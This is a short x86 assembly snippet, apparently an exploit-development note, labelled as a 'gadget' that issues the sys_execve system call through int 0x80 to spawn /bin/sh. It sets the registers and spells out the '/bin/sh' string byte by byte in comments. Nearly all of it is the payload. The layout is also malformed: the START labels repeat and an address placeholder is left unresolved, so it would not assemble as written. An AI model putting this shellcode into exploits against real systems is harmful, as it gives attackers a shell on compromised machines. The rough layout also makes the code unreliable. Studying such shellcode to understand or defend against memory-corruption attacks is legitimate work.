# Gatdget to call the sys_execve with the /bin/sh
START
mov eax, 0x0b   # Setup the eax to call the sys_execve
mov ecx, 0x0    # set the param to NULL
mov edx, 0x0    # set the enviornm to NULL
mov ebx, INDIRIZZO_STACK
int 0x80
nop
START
nop
INDIRIZZO_STACK
# 0x2f /
# 0x62 b
# 0x69 i
# 0x6e n
# 0x2f /
# 0x73 s
# 0x68 h
# 0x00 \0